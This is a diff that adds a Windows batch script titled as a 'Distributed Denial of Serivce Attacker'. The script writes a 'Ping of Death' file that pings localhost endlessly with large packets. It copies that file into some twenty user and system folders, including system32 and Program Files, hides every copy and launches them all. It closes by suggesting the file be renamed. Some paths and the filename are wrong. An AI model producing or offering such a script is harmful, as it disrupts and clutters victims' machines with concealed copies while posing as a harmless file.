@@ -1,0 +1,77 @@
+Internal Distributed Denial of Serivce Attacker
+
+echo @echo off >>Downsys.bat
+echo Title Ping of Death >>Downsys.bat
+echo color 07 >>Downsys.bat
+echo mode 60,16 >>Downsys.bat
+echo cls >>Downsys.bat
+echo ping 127.0.0.1 -t -l 65000 >>Downsys.bat
+echo @exit >>Downsys.bat
+Copy "Downsys.bat" "C:\Users\%username%\Videos"
+Copy "Downsys.bat" "C:\PerfLogs"
+Copy "Downsys.bat" "C:\ProgramData"
+Copy "Downsys.bat" "C:\%user%"
+Copy "Downsys.bat" "C:\Users\%username%\Videos"
+Copy "Downsys.bat" "C:\Users\%username%\Downloads"
+Copy "Downsys.bat" "C:\Users\%username%\Documents"
+Copy "Downsys.bat" "C:\Users\%username%\AppData\Roaming"
+Copy "Downsys.bat" "C:\Users\%username%\AppData\Local\Temp"
+Copy "Downsys.bat" "C:\Program Files\Common_Files\System"
+Copy "Downsys.bat" "C:\Users\%username%\Desktop"
+Copy "Downsys.bat" "C:\Program Files\Common_Files"
+Copy "Downsys.bat" "C:\Program Files"
+Copy "Downsys.bat" "C:\Windows\system32"
+Copy "Downsys.bat" "C:\Users\%username%\Music"
+Copy "Downsys.bat" "C:\Users\%username%\AppData"
+Copy "Downsys.bat" "C:\Windows"
+Copy "Downsys.bat" "C:\Users\%username%\Pictures"
+Copy "Downsys.bat" "C:\"
+Copy "Downsys.bat" "C:\Users"
+Copy "Downsys.bat" "C:\ProgramData"
+Copy "Downsys.bat" "C:\~MSSETUP.T\"
+Attrib C:\Users\%username%\Videos\Downsys.bat +H
+Attrib C:\Users\%username%\Downloads\Downsys.bat +H
+Attrib C:\Users\%username%\Documents\Downsys.bat +H
+Attrib C:\Users\%username%\AppData\Roaming\Downsys.bat +H
+Attrib C:\Users\%username%\AppData\Local\Temp\Downsys.bat +H
+Attrib C:\Program Files\Common_Files\System\Downsys.bat +H
+Attrib C:\Users\%username%\Desktop\Downsys.bat +H
+Attrib C:\ProgramData\Downsys.bat +H
+Attrib C:\%user%\Downsys.bat +H
+Attrib C:\~MSSETUP.T\Downsys.bat +H
+Attrib C:\Program Files\Common_Files\Downsys.bat +H
+Attrib C:\Program Files\Downsys.bat +H
+Attrib C:\PerfLogs\Downsys.bat +H
+Attrib C:\Windows\system32\Downsys.bat  +H
+Attrib C:\Users\%username%\Music\Downsys.bat +H
+Attrib C:\Users\%username%\AppData\Downsys.bat +H
+Attrib C:\Windows\Downsys.bat +H
+Attrib C:\Users\%username%\Pictures\Downsys.bat +H
+Attrib C:\Downsys.bat +H
+Attrib C:\Users\Downsys.bat +H
+Attrib C:\ProgramData\Downsys.bat +H
+Start C:\Users\%username%\Videos\Downsys.bat
+Start C:\Users\%username%\Downloads\Downsys.bat
+Start C:\Users\%username%\Documents\Downsys.bat
+Start C:\Users\%username%\AppData\Roaming\Downsys.bat
+Start C:\Users\%username%\AppData\Local\Temp\Downsys.bat
+Start C:\Program Files\Common_Files\System\Downsys.bat
+Start C:\Users\%username%\Desktop\Downsys.bat
+Start C:\ProgramData\Downsys.bat
+Start C:\%user%\Downsys.bat
+Start C:\~MSSETUP.T\Downsys.bat
+Start C:\Program Files\Common_Files\Downsys.bat
+Start C:\Program Files\Downsys.bat
+Start C:\PerfLogs\Downsys.bat
+Start C:\Windows\system32\Downsys.bat 
+Start C:\Users\%username%\Music\Downsys.bat
+Start C:\Users\%username%\AppData\Downsys.bat 
+Start C:\Windows\Downsys.bat
+Start C:\Users\%username%\Pictures\Downsys.bat
+Start C:\Downsys.bat
+Start C:\Users\Downsys.bat
+Start C:\ProgramData\Downsys.bat
+@exit
+
+"Downsts.bat" Can be changed into whatever filename you want.
+
